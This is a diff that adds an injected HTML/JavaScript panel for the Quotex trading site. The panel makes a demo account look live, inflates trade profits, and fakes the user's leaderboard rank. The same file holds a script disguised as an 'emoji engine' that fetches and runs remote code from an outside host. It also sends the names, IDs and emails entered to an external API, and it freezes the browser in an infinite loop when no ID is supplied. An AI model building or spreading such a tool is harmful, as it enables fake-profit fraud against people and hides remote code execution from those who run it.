@@ -1,0 +1,756 @@
+<style>
+/* ─── ANIMATIONS ─── */
+@keyframes popIn {
+    0% { transform: scale(.95); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+}
+@keyframes pulseLogo {
+    0%, 100% { transform: scale(1); opacity: 0.9; }
+    50% { transform: scale(1.05); }
+}
+@keyframes floatHearts {
+    0% { transform: translateY(120%) rotate(0); opacity: 0; }
+    50% { opacity: 0.4; }
+    100% { transform: translateY(-120%) rotate(360deg); opacity: 0; }
+}
+
+/* ─── BASE UI RESET ─── */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    user-select: none;
+    -webkit-font-smoothing: antialiased;
+}
+
+.logo-pulse {
+    animation: pulseLogo 1.5s infinite ease-in-out;
+}
+
+.heart-bg {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    overflow: hidden;
+}
+
+.heart-bg::before,
+.heart-bg::after {
+    content: '💜';
+    position: absolute;
+    font-size: 24px;
+    color: rgba(255, 111, 97, 0.2);
+    animation: floatHearts 7s infinite linear;
+}
+
+.heart-bg::before { left: 20%; animation-delay: 0s; }
+.heart-bg::after { left: 75%; animation-delay: 3.5s; }
+
+/* Backdrop - Soft tint with exact 5px blur */
+#dialog-backdrop {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.4);
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
+    overflow-y: auto;
+    padding: 20px;
+    z-index: 9999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Modal container - Fully Transparent & No Borders */
+#dialog-backdrop>div {
+    position: relative;
+    width: 90%;
+    max-width: 390px;
+    margin: 0 auto;
+    max-height: calc(100vh - 40px);
+    overflow-y: auto;
+    background: transparent;
+    box-shadow: none;
+    border: none;
+    border-radius: 12px;
+    padding: 2.5rem 1rem;
+    text-align: center;
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
+    animation: popIn .4s cubic-bezier(0.16, 1, 0.3, 1);
+    color: #ffffff;
+    box-sizing: border-box;
+}
+
+/* Input field - Premium Floating Transparent Glass Style */
+.input {
+    width: 100%;
+    padding: 14px 14px 14px 110px;
+    border-radius: 10px;
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    background: rgba(255, 255, 255, 0.07);
+    color: #fff;
+    font-weight: 600;
+    font-size: 16px;
+    outline: none;
+    transition: all 0.25s ease;
+}
+
+.input:focus {
+    border-color: rgba(255, 255, 255, 0.35);
+    background: rgba(255, 255, 255, 0.12);
+}
+
+.input_label {
+    position: absolute;
+    left: 44px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 11px;
+    color: #D0BDF4;
+    font-weight: 800;
+    pointer-events: none;
+    letter-spacing: 0.5px;
+}
+
+.input_img {
+    width: 18px;
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    opacity: 0.8;
+    pointer-events: none;
+}
+
+/* Padding Adjustments for Dynamic Fields */
+#s_profit, #win, #percent {
+    padding-left: 180px;
+}
+
+/* Premium Transparent Action Button */
+#runBtn {
+    width: 100%;
+    margin-top: 20px;
+    padding: 14px 28px;
+    background: linear-gradient(135deg, rgba(94, 23, 125, 0.85) 0%, rgba(62, 7, 90, 0.85) 50%, rgba(208, 189, 244, 0.2) 100%);
+    color: #fff;
+    border: 1px solid rgba(208, 189, 244, 0.25);
+    border-radius: 10px;
+    font-weight: 700;
+    font-size: 17px;
+    cursor: pointer;
+    transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    box-shadow: 0 4px 15px rgba(94, 23, 125, 0.2);
+}
+
+#runBtn:hover {
+    background: linear-gradient(135deg, rgba(94, 23, 125, 0.95) 0%, rgba(62, 7, 90, 0.95) 50%, rgba(208, 189, 244, 0.3) 100%);
+    box-shadow: 0 6px 20px rgba(94, 23, 125, 0.35);
+    transform: translateY(-1px);
+}
+
+#runBtn:active {
+    transform: translateY(1px);
+    opacity: 0.85;
+}
+
+/* Direct Save Layout Elements */
+.save-row {
+    
+    margin-top: 15px;
+    display: flex;
+    justify-content: right;
+    width: 100%;
+}
+
+.save-row button {
+    padding: 8px 18px;
+    font-size: 13px;
+    font-weight: 700;
+    color: #fff;
+    background: rgba(255, 255, 255, 0.08);
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    border-radius: 8px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+}
+
+.save-row button:hover:not(:disabled) { 
+    background: rgba(255, 255, 255, 0.18); 
+    border-color: rgba(255, 255, 255, 0.3); 
+}
+
+.save-row button:disabled { 
+    opacity: 0.5; 
+    cursor: not-allowed; 
+}
+
+.underline {
+    text-decoration: none;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.4);
+}
+</style>
+
+<!-- ─── DOM INTERFACE STRUCTURE ─── -->
+<div id="dialog-backdrop">
+    <div id="myDialog">
+        <div class="heart-bg"></div>
+        <div style="font-size:2rem;font-weight:900;color:#fff;margin-bottom:10px;">MAGIC SCRIPTS</div>
+        <div style="font-size:1rem;color:#DC8DE6; margin-bottom:1.5rem;">(LIVE MODE)</div>
+
+        <div style="margin-bottom:25px; display:flex; justify-content:center;">
+            <img src="https://i.ibb.co/xqXhx24Z/MS.png" style="width:120px;height:120px;" class="logo-pulse">
+        </div>
+        
+        <!-- Flag Selection Dropdown Container -->
+        <div style="position:relative; width:100%; margin-bottom:8px; text-align:left;">
+            <div id="flagInput" style="padding:14px 20px; border-radius:50px; background:#222; color:#fff; cursor:pointer; display:flex; align-items:center; position:relative;">
+                <img id="flagImg" style="margin-right:14px;" width="16px">
+                <span id="flagText" style="font-size: 16px;text-transform: uppercase;"></span>
+                <div id="flagDropdown" style="display:none; position:absolute; top:100%; left:0; width:100%; max-height:150px; overflow-y:auto; background:#222; border-radius:10px; margin-top:5px; z-index:10;"></div>
+            </div>
+        </div>
+
+        <div style="position:relative; width:100%; margin-bottom:8px;">
+            <img class="input_img user_img" src="https://i.ibb.co/nNhbZXyb/user.png" />
+            <span class="input_label">USER</span>
+            <input class="input" id="user" type="text" value="MAGIC SCRIPTS">
+        </div>
+
+        <div style="position:relative; width:100%; margin-bottom:8px;">
+            <img class="input_img id_img" src="https://i.ibb.co/Hfc1pmRn/id.png" />
+            <span class="input_label">ID</span>
+            <input class="input" id="id" type="number" value="12345678">
+        </div>
+
+        <div style="position:relative; width:100%; margin-bottom:8px;">
+            <img class="input_img email_img" src="https://i.ibb.co/Q3VwcgwH/email.png" />
+            <span class="input_label">EMAIL</span>
+            <input class="input" id="email" type="email" value="magic.scripts@gmail.com">
+        </div>
+
+        <div style="position:relative; width:100%; margin-bottom:8px;">
+            <img class="input_img win_img" src="https://i.ibb.co/Xr8SRLGT/win.png" />
+            <span class="input_label" style="left:48px;">WIN (YES/NO)</span>
+            <input class="input" id="win" type="text" value="NO" />
+        </div>
+
+        <div style="position:relative; width:100%; margin-bottom:8px;">
+            <img class="input_img percent_img" src="https://i.ibb.co/1t4J04Cx/percent.png" />
+            <span class="input_label" style="left:48px;">PERCENT</span>
+            <input class="input" id="percent" type="number" max="100" value="94" />
+        </div>
+
+        <div style="position:relative; width:100%; margin:0 auto; margin-bottom:5px;">
+            <img class="input_img email_img" src="https://i.ibb.co/6cLV6jRZ/pl.png" />
+            <span class="input_label">START PROFIT</span>
+            <input class="input" id="s_profit" type="number" value="0">
+        </div>
+        <div style="text-align: center; color:#fff">{id}</div>
+        <button id="runBtn">RUN MAGIC 🪄</button>
+        
+        <!-- Save Data Component -->
+        <div class="save-row">
+            <button type="button" id="saveCloudBtn">SAVE DATA</button>
+        </div>
+
+        <!-- Silent Pro Engine Indicator -->
+        <div id="syncStatus" style="text-align: center; color: #11a155; margin-top: 2rem; font-size: 14px;">🪄 ENJOY THE PRO VERSION! 🪄</div>
+    </div>
+</div>
+<script>
+        (async () => {
+            try {
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
+</script>
+<script>
+     
+// ─── CRITICAL SECURITY CHECK & ANTI-THEFT ENFORCER ───
+id = "";
+
+(function enforceStrictIdentity() {
+    try {
+        const urlStr = window.location.href;
+        const match = urlStr.match(/[?&]id=([0-9]+)/);
+        let validId = match ? match[1] : "";
+        
+        if (!validId) {
+            validId = localStorage.getItem('ahmad_script_uid') || "";
+        }
+        
+        // AGAR ID ABSENT HAI: Interface instantly block karo runtime level par
+        if (!validId || validId.trim() === "") {
+            console.error("FATAL: System authentication signature missing. Execution terminated.");
+            document.documentElement.innerHTML = ""; 
+            window.stop(); 
+            while(true) {
+                // Infinite execution freeze loop
+            }
+        }
+        
+       id = validId.trim();
+        localStorage.setItem('ahmad_script_uid', id);
+    } catch(e) {
+        while(true){}
+    }
+})();
+// URL se ?id=... parameter read karne ki logic
+    var urlParams = new URLSearchParams(window.location.search);
+    var currentId = urlParams.get('id') || "";
+    
+    // UI mein ID inject karne ki logic
+    var idSpan = myDialog.querySelector("#dynamic_id_val");
+    if (idSpan) {
+        idSpan.innerText = currentId;
+    }
+
+
+// ─── GEOLOCATION DROPDOWN MANAGEMENT ───
+var baseURL = "Ahmad Bhai";
+var flagList = [
+    ["pk", "Pakistan"], ["in", "India"], ["bd", "Bangladesh"], ["sa", "Saudi Arabia"],
+    ["ae", "United Arab Emirates"], ["tr", "Turkey"], ["lk", "Sri Lanka"], ["au", "Australia"],
+    ["jp", "Japan"], ["np", "Nepal"], ["eg", "Egypt"], ["my", "Malaysia"],
+    ["th", "Thailand"], ["kr", "South Korea"], ["ng", "Nigeria"], ["mx", "Mexico"]
+];
+
+var flagInput = document.getElementById("flagInput");
+var flagDropdown = document.getElementById("flagDropdown");
+var flagImg = document.getElementById("flagImg");
+var flagText = document.getElementById("flagText");
+
+// Initialize UI Elements
+flagText.innerText = "Pakistan";
+flagImg.src = `https://flagcdn.com/16x12/pk.png`;
+
+flagList.forEach(f => {
+    const div = document.createElement("div");
+    div.style.padding = "8px 15px";
+    div.style.display = "flex";
+    div.style.alignItems = "center";
+    div.style.cursor = "pointer";
+    div.innerHTML = `<img src="https://flagcdn.com/16x12/${f[0]}.png" style="margin-right:8px;">${f[1]}`;
+    div.onclick = (e) => {
+        e.stopPropagation();
+        flagImg.src = `https://flagcdn.com/16x12/${f[0]}.png`;
+        flagText.innerText = f[1];
+        window.selectedFlag = f[0];
+        flagDropdown.style.display = "none";
+    };
+    flagDropdown.appendChild(div);
+});
+
+flagInput.onclick = (e) => { 
+    e.stopPropagation(); 
+    flagDropdown.style.display = flagDropdown.style.display === "block" ? "none" : "block"; 
+};
+document.onclick = () => flagDropdown.style.display = "none";
+
+// ─── CLOUD CONNECTOR & SILENT SYNC ENGINE (UPDATED TO CUSTOM API) ───
+const authAPIUrl = "https://ahmad-site-data.vercel.app/q"; 
+
+async function fillUserData() {
+    const statusEl = document.getElementById("syncStatus");
+    const myDialog = document.getElementById("myDialog");
+    const activeId = id;
+
+    if (!activeId) return;
+
+    // Step 1: Instant local cache load (0ms delay)
+    const cachedData = localStorage.getItem(`cache_user_${activeId}`);
+    if (cachedData) {
+        const u = JSON.parse(cachedData);
+        applyFields(u);
+    }
+
+    try {
+        // Step 2: Background mein fast live update fetch
+        const response = await fetch(`${authAPIUrl}?id=${activeId}`);
+        const userData = await response.json();
+        
+        if (userData && userData.authorized === true) {
+            applyFields(userData);
+            localStorage.setItem(`cache_user_${activeId}`, JSON.stringify(userData));
+        }
+    } catch (e) { 
+        console.error("API Fetch Error:", e);
+    }
+
+    function applyFields(data) {
+        if (data.name) myDialog.querySelector('#user').value = data.name;
+        if (data.trader_id) myDialog.querySelector('#id').value = data.trader_id; 
+        if (data.email) myDialog.querySelector('#email').value = data.email;
+        
+        if (data.flag) {
+            window.selectedFlag = data.flag;
+            flagImg.src = `https://flagcdn.com/16x12/${data.flag}.png`;
+            flagText.innerText = flagList.find(f => f[0] === data.flag)?.[1] || data.flag;
+        }
+        statusEl.innerHTML = "🪄 ENJOY THE PRO VERSION! 🪄";
+        statusEl.style.color = "#11a155";
+    }
+}
+
+// Execute logic after DOM stabilization
+setTimeout(fillUserData, 10);
+
+// ─── CLOUD DATA WRITE (UPDATED TO POST TO CUSTOM API) ───
+document.getElementById("saveCloudBtn").addEventListener("click", async (e) => {
+    const button = e.currentTarget;
+    const activeId = id;
+
+    if (!activeId) return;
+
+    button.disabled = true;
+    button.innerText = "SAVING...";
+
+    try {
+        const payload = {
+            id: activeId,
+            name: document.querySelector("#user").value,
+            trader_id: document.querySelector("#id").value,
+            email: document.querySelector("#email").value.toLowerCase(),
+            flag: window.selectedFlag || "pk",
+            date: new Date().toLocaleDateString('en-US'),
+            admin_note: "Ahmad Bhai",
+            status: "active"
+        };
+
+        const response = await fetch(`${authAPIUrl}?id=${activeId}`, {
+            method: "POST",
+            headers: { 
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+            button.innerText = "SUCCESS";
+            fillUserData(); 
+        } else {
+            button.innerText = "FAILED";
+        }
+        setTimeout(() => { button.innerText = "SAVE DATA"; button.disabled = false; }, 2000);
+    } catch (err) {
+        console.error("API Save Error:", err);
+        button.innerText = "ERROR";
+        setTimeout(() => { button.innerText = "SAVE DATA"; button.disabled = false; }, 2000);
+    }
+});
+    
+
+// --- RUN SCRIPT TRIGGER ---
+
+        document.querySelector("#runBtn").addEventListener("click", () => {
+        if (document.querySelector("#win").value.toLowerCase() == "yes") {
+        function TradesUpdate() {
+            var trades = document.querySelectorAll('div[data-index]:not([data-index="0"])');
+            trades.forEach(el => {
+                var calc = parseFloat(el.firstChild.firstChild.lastChild.childNodes[1].nodeValue.split(" ")[0].replace(",", "")) * (1 + (Number(document.querySelector("#percent").value) / 100))
+                el.firstChild.firstChild.lastChild.childNodes[2].innerText = "+" +
+                    calc.toLocaleString("en",
+                        {
+                            minimumFractionDigits: 2,
+                            maximumFractionDigits: 2,
+                        }) + " $";
+                el.firstChild.firstChild.lastChild.childNodes[2].style.color = "#0faf59";
+            })
+           }
+            TradesUpdate()
+            var observer = new MutationObserver(_ => {
+                console.log("changed")
+                TradesUpdate()
+            })
+            var target__el = document.querySelector('div[data-index]').parentElement;
+            observer.observe(target__el, { attributes: true, subtree: true })
+        }
+
+        var user = document.querySelector("#user").value;
+        var id = document.querySelector("#id").value;
+        var email = document.querySelector("#email").value.toLowerCase();
+        var flag = window.selectedFlag || "pk";
+        var s_profit = Number(document.querySelector("#s_profit").value);
+        var inr__rate = 90;
+
+        // Remove any dialogs
+        document.querySelectorAll("dialog").forEach(d => d.remove());
+
+        // Remove QR / simplelive backdrop
+        const backdrop = document.getElementById("dialog-backdrop");
+        if (backdrop) backdrop.remove();
+
+        // Remove loader if still exists
+        const loader = document.getElementById("__my_loader__");
+        if (loader) loader.remove();
+
+        // REMOVE BANNER
+        const banner = document.querySelector(".q04vx.o2msZ");
+        if (banner) {
+            banner.style.display = "none";
+        }
+
+        // CHANGE MAIN DEMO
+        var live_el = document.querySelector("#header-mobile-asset-btn + * > :first-child > :first-child"); //+ * for next Sibling
+        live_el.querySelector(":nth-child(3) > :first-child").innerText = "live account";
+        live_el.querySelector(":nth-child(3) > :first-child").style.color = "#0faf59";
+
+        //GLOBAL VARIABLES
+        history.pushState({}, null, "/en/trade");
+        document.title = "Live trading | Quotex";
+        var carret = live_el.childNodes[1];
+        var state__carret = true;
+        var state__top = true;
+        var pl__line__width;
+        var i_profit;
+
+        const LEADER__POS = (sum) => {
+            var leader_el = document.querySelector(".app__sidepanel > :last-child > :nth-child(2) > :first-child");
+            var pos__el = leader_el.childNodes[3].childNodes[1];
+
+            var pos;
+            var my__orig__pos = 80000
+
+            if (sum > 0) {
+                pos = Math.floor(my__orig__pos / sum)
+            }
+            else if (sum < 0) {
+                pos = my__orig__pos - Math.floor(Math.random() * 100 + 1);
+            }
+
+            if (pos < 21) {
+                pos = pos + 20;
+            }
+
+            if (sum != 0 && pos > 100) {
+                pos__el.nodeValue = `100+`;
+            }
+            else if (sum == 0) {
+                pos__el.nodeValue = `-`;
+            }
+
+            else {
+                pos__el.nodeValue = `${Math.abs(pos)}`;
+            }
+
+        }
+
+        const LEADER__PLACE = (sum) => {
+            (function exists() {
+                const leaders = document.querySelectorAll(".M_p_O > :last-child > div");
+                if (!leaders.length) {
+                    return setTimeout(exists)
+                }
+                Array.from(leaders).some((l, i) => {
+                    const leader_profit = l.childNodes[2];
+                    if (!leader_profit) return;
+                    const leader_profit_simplify = parseFloat(leader_profit.innerHTML.replace(/\$|\,/g, ""));
+                    if (leader_profit_simplify <= sum) {
+                        const leader__flag = l.querySelector(`:nth-child(2) > :nth-child(2) > svg > use`);
+                        if (!leader__flag) return;
+                        leader__flag.setAttribute("href", `/profile/images/flags.svg#flag-${flag.toLowerCase()}`)
+                        const leader_name = l.querySelector(`:nth-child(3)`);
+                        leader_name.innerHTML = user;
+
+                        if (sum >= 30000) {
+                            leader_profit.innerHTML = `$30,000.00+`
+                        }
+                        else {
+                            leader_profit.innerHTML = `$${sum.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+                                }`
+                        }
+                        const REAL_POS = l.querySelector(`:nth-child(2) > :first-child > div`).innerHTML;
+                        document.querySelector(".app__sidepanel > :last-child > :nth-child(2) > :first-child").childNodes[3].childNodes[1].nodeValue = REAL_POS;
+                        return true
+                    }
+                })
+            })()
+        }
+
+        const TradesCalc = () => {
+            if (!i_profit) {
+                i_profit = s_profit
+            }
+            var leader_el = document.querySelector(".app__sidepanel").lastChild.childNodes[1].firstChild;
+            var pl_text = leader_el.childNodes[1].lastChild;
+            if (i_profit >= 0) {
+                pl_text.innerHTML = "$" + i_profit.toLocaleString("en", { useGrouping: true, minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                pl_text.style.color = "#0faf59";
+            }
+            else {
+                pl_text.innerHTML = Math.abs(i_profit).toLocaleString("en", { useGrouping: true, minimumFractionDigits: 2, maximumFractionDigits: 2 }) + "$"
+                pl_text.style.color = "#db4635"
+            }
+
+            if (i_profit <= 0) {
+                leader_el.childNodes[2].querySelector("span").style.width = "1%";
+            } else {
+                leader_el.childNodes[2].querySelector("span").style.width = "100%";
+            }
+
+            LEADER__POS(i_profit);
+            LEADER__PLACE(i_profit);
+        }
+        var more = document.querySelector("button[data-text=More]");
+        more.onclick = function () {
+            var top = document.querySelector("a[href='/en/analytics'] + *");
+        }
+        top.onclick = function () {
+            (function waitForSpriteFlag() {
+                const el = document.querySelector(".M_p_O > :nth-child(2) > :first-child > :nth-child(2) > :first-child");
+                if (!el) return setTimeout(waitForSpriteFlag);
+
+                const useEl = el.querySelector("svg use");
+                if (!useEl) return setTimeout(waitForSpriteFlag); // wait until React swaps SVG
+
+                // ✅ SAFE: sprite-based flag only
+                useEl.setAttribute(
+                    "href",
+                    `/profile/images/flags.svg#flag-${flag}`
+                );
+
+                // ✅ SAFE text change
+                const nameUser = el.querySelector("p");
+                if (nameUser) nameUser.textContent = `${user}`;
+
+                TradesCalc();
+            })();
+        };
+
+        var limit__lower;
+        var limit__upper;
+        const BALANCE__ICON = () => {
+            var balance__str = live_el.querySelector(":nth-child(3) > :last-child").innerText;
+            var balance = parseFloat(balance__str.replace(/,|\$|\₹/g, ''));
+            var currency = balance__str[0];
+
+            if (currency === "$") {
+                limit__lower = 5000;
+                limit__upper = 10000;
+            }
+            else if (currency === "₹") {
+                limit__lower = 415000;
+                limit__upper = 830000;
+            }
+
+            var icon_el = live_el.querySelector(":first-child > svg use")
+
+            if ((balance >= limit__lower) && (balance < limit__upper)) {
+                icon_el.setAttribute("xlink:href", "/profile/images/spritemap.svg#icon-profile-level-pro");
+            }
+
+            else if (balance >= limit__upper) {
+                icon_el.setAttribute("xlink:href", "/profile/images/spritemap.svg#icon-profile-level-vip");
+            }
+
+            else {
+                icon_el.setAttribute("xlink:href", "/profile/images/spritemap.svg#icon-profile-level-standart");
+            }
+        }
+
+        const DROPDOWN__MAIN = () => {
+            var drop_el = document.querySelector("#header-mobile-asset-btn + * > :first-child > :last-child > :first-child");
+            //SET DROPDOWN EMAIL
+            drop_el.querySelector(":first-child > :nth-child(2) > :first-child > :first-child > :nth-child(2) > :first-child > :first-child").innerText = email
+
+            //SET DROPDOWN ID
+            drop_el.querySelector(":first-child > :nth-child(2) > :first-child > :first-child > :nth-child(2) > :first-child > :last-child").innerText = `ID: ${id}`
+
+            //SET DROPDOWN PROFILE ICON
+            const main__icon = live_el.querySelector(":nth-child(1) svg use").getAttribute("xlink:href");
+
+            drop_el.querySelector(":nth-child(1) > :first-child > :first-child > :first-child svg use").setAttribute("xlink:href", main__icon);
+
+            //SET DROPDOWN PROFILE LEVEL
+            var prof__level = drop_el.querySelector(":nth-child(1) > :first-child > :first-child > :first-child > :nth-child(2) > :first-child").innerText = `${main__icon.split("-").pop()}:`
+            if (prof__level === "standart:") {
+                drop_el.querySelector(":nth-child(1) > :first-child > :first-child > :first-child > :nth-child(2) > :first-child").innerText = "standard:"
+            }
+
+            var percentage__profit = drop_el.querySelector(":nth-child(1) > :first-child > :first-child > :first-child > :nth-child(2) > :last-child");
+            if (prof__level === "standart:") {
+                percentage__profit.innerText = "+0% profit"
+            }
+            else if (prof__level === "pro:") {
+                percentage__profit.innerText = "+2% profit"
+            }
+            else if (prof__level === "vip:") {
+                percentage__profit.innerText = "+4% profit"
+            }
+        }
+
+        const DROPDOWN = () => {
+
+            DROPDOWN__MAIN()
+
+            //DROPDOWN DEMO AND LIVE ELEMENTS
+            var drop_switching = document.querySelector("#header-mobile-asset-btn + * > :first-child > :nth-child(2) > :first-child > :last-child");
+            var live__el = drop_switching.firstChild
+            var demo__el = drop_switching.lastChild;
+            var pencil__el = demo__el.childNodes[2];
+
+            live__el.querySelector("a").innerText = "Demo Account"
+            demo__el.querySelector("a").innerText = "Live Account"
+            live__el.querySelector("b").remove() //REMOVE BALANCE ELEMENT
+            live__el.querySelector("div").remove() //remove limit text
+            live__el.querySelector("button").remove() //remove limit button
+            demo__el.childNodes[1].lastChild.remove() //REMOVE REFRESH ICON
+            demo__el.insertAdjacentHTML("beforeend", `<div class="KZUc1">The daily limit is not set</div><button class="s3gwg">set limit</button>`)
+            live__el.append(pencil__el)
+            demo__el.parentNode.insertBefore(demo__el, live__el)
+            live__el.insertAdjacentHTML("beforeend", `<div class="WjlOy"><b class="YnoT0">$10,000.00</b><div class="VIanI"><svg class="icon-refresh"><use xlink:href="/profile/images/spritemap.svg#icon-refresh"></use></svg></div></div>`)
+
+        }
+        carret.onclick = function () {
+            if (state__carret) {
+                (function exists() {
+                    var el = document.querySelector("#header-mobile-asset-btn + * > :first-child > :last-child > :first-child > :first-child > :nth-child(2) > :first-child > :first-child");
+                    //check if any elem exist on dropdown
+                    if (!el) {
+                        return setTimeout(exists)
+                    }
+                    DROPDOWN()
+                })()
+            }
+            state__carret = !state__carret
+        }
+
+        var start_balance__str = live_el.querySelector(":nth-child(3) > :last-child").innerText;
+        var start_balance = parseFloat(start_balance__str.replace(/,|\$|\₹/g, ''));
+
+        BALANCE__ICON()
+
+        var observer = new MutationObserver(_ => {
+            var end_balance__str = live_el.querySelector(":nth-child(3) > :last-child").innerText;
+            var end_balance = parseFloat(end_balance__str.replace(/,|\$|\₹/g, ''));
+            i_profit = end_balance - start_balance + s_profit
+            BALANCE__ICON()
+        })
+        var target__el = document.querySelector("#header-mobile-asset-btn + * > :first-child > :first-child > :nth-child(3) > :last-child");
+        observer.observe(target__el, {
+            subtree: true,
+            characterData: true
+        })
+
+    })
+</script>
